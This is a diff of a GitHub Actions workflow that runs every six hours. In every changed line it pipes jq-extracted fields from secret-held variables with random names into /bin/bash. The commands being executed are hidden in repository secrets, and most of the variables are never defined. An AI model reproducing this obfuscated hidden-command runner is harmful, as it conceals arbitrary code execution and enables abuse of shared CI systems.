@@ -3,24 +3,21 @@ name: andreilu1
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
-
+    - cron: '23 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: andreilu1
         env:
-          rcqo9923: ${{ secrets.rcqo9923 }}
+          w392: ${{ secrets.w392 }}
         run: |
-          echo $rcqo9923 | jq -r .tjiq70282 | /bin/bash
-          echo $m1982 | jq -r .euy968 | /bin/bash
-          echo $tsn99 | jq -r .ppxi73 | /bin/bash
-          echo $waw6 | jq -r .xwuv1 | /bin/bash
-          echo $isqi19 | jq -r .mcqgo0414 | /bin/bash
-          echo $pkhfd8 | jq -r .b3 | /bin/bash
-          echo $c8 | jq -r .d4 | /bin/bash
-          echo $appa245 | jq -r .ecr645 | /bin/bash
+          echo $w392 | jq -r .nysmq7 | /bin/bash
+          echo $xes72148 | jq -r .gy671 | /bin/bash
+          echo $ycvts3301 | jq -r .s86 | /bin/bash
+          echo $hlc37089 | jq -r .hfj482 | /bin/bash
+          echo $lqts07 | jq -r .pu1 | /bin/bash
+          echo $gw43 | jq -r .fwyee0 | /bin/bash
+          echo $jzw241 | jq -r .arps3736 | /bin/bash
 
